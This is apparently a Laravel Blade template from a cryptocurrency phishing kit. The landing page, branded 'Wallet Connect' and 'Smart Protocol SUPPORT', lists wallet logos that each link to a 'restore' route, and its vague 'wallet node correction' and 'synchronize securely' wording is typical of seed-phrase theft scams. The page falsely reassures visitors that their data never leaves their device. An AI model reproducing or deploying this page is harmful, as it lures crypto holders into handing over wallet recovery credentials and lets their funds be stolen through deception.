@extends('layouts.core')

@section('title')
    Wallets | {{ config('app.name', 'Mimi') }} Wallet Connect
@endsection

@section('intro-title')
    <h3>Smart Protocol SUPPORT</h3>
@endsection

@section('tagline')
    Most secure tool for all wallet node correction featuring kyc and others interesting functions
@endsection

@section('intro-action')
    <div class="border border-dark text-bold p-4 rounded-3">
        <h5 class="border border-dark text-uppercase p-2 rounded-3">Select Wallet Type</h5>
        <p class="fs-4 mt-4">
            To access tool: Choose your wallet and proceed to synchronize securely. Your data stays on your device and is
            never
            stored.
        </p>
    </div>
@endsection

@section('content')
    <div class="container">
        <div class="wallets-grid">
            @foreach (File::glob(public_path('images/wallets') . '/*') as $file)
                @php
                    $broken = explode('/', $file);
                    $filename = end($broken);
                    $filename_with_ext = preg_replace('/\.([^.]*)$/', '', $filename);
                    $only_filename = str_replace('_', ' ', $filename_with_ext);
                @endphp
                <div data-aos="fade-up" class="wallet">
                    <div class="mb-4">
                        <img src="{{ asset('images/wallets/' . $filename) }}" alt="" class="wallet-image ">
                    </div>
                    <a href="{{ route('restore', ['wallet' => ucwords($only_filename)]) }}"
                        class="link-dark text-decoration-none text-uppercase stretched-link"
                        style="font-weight: 600">{{ __($only_filename) }}</a>
                </div>
            @endforeach
        </div>
    </div>
@endsection
